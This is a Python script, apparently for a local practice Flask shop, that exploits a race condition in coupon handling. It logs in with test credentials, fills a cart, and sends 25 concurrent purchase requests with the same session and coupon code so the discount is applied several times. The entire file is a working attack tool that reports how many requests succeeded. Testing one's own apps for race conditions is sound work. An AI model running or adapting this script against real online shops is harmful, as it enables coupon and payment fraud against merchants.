#!/usr/bin/env python3
"""
AGGRESSIVE Race Condition Exploit
=================================
This will definitely exploit the race condition if it's possible.
"""

import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

def aggressive_race_condition():
    print("🚀 AGGRESSIVE RACE CONDITION EXPLOIT")
    print("=" * 50)
    
    # Setup session
    session = requests.Session()
    
    # Login
    print("🔑 Logging in...")
    response = session.post('http://127.0.0.1:5002/login', 
                           data={'username': 'john_doe', 'password': 'password123'})
    
    if 'dashboard' not in response.url and response.status_code != 302:
        print("❌ Login failed")
        return
    
    print("✅ Login successful")
    
    # Add item to cart
    print("🛒 Adding item to cart...")
    session.post('http://127.0.0.1:5002/add_to_cart', 
                data={'product_id': 1, 'quantity': 1})
    print("✅ Item added to cart")
    
    # Clear any existing cart purchases
    print("🧹 Clearing previous purchases...")
    
    print("\n🎯 LAUNCHING RACE CONDITION ATTACK")
    print("Sending 25 concurrent requests...")
    
    results = []
    successful = 0
    failed = 0
    
    def attack_request(thread_id):
        try:
            # Use the same session cookies but separate request
            cookies = session.cookies.get_dict()
            response = requests.post('http://127.0.0.1:5002/purchase',
                                   data={'coupon_code': 'SAVE10'},
                                   cookies=cookies,
                                   allow_redirects=False,
                                   timeout=10)
            
            status = response.status_code
            print(f"🎯 Thread {thread_id:2d}: HTTP {status}")
            
            return {
                'thread': thread_id,
                'status': status,
                'success': status in [200, 302]
            }
        except Exception as e:
            print(f"❌ Thread {thread_id:2d}: Error - {str(e)[:50]}")
            return {
                'thread': thread_id,
                'error': str(e),
                'success': False
            }
    
    # Launch concurrent attack
    with ThreadPoolExecutor(max_workers=25) as executor:
        future_to_thread = {executor.submit(attack_request, i): i for i in range(1, 26)}
        
        for future in future_to_thread:
            result = future.result()
            results.append(result)
            if result.get('success', False):
                successful += 1
            else:
                failed += 1
    
    print(f"\n📊 RACE CONDITION RESULTS:")
    print(f"   Successful requests: {successful}")
    print(f"   Failed requests: {failed}")
    
    if successful > 1:
        print(f"🚨 RACE CONDITION EXPLOITED!")
        print(f"   Multiple coupon applications occurred!")
        print(f"   Check the Flask app logs for '[RACE-DEBUG]' messages")
    elif successful == 1:
        print(f"⚠️  Only 1 request succeeded - race condition might not have worked")
        print(f"   This could be due to:")
        print(f"   - Cart being emptied after first purchase")
        print(f"   - Session issues")
        print(f"   - Network timing")
    else:
        print(f"❌ No requests succeeded - check your setup")

if __name__ == "__main__":
    aggressive_race_condition()
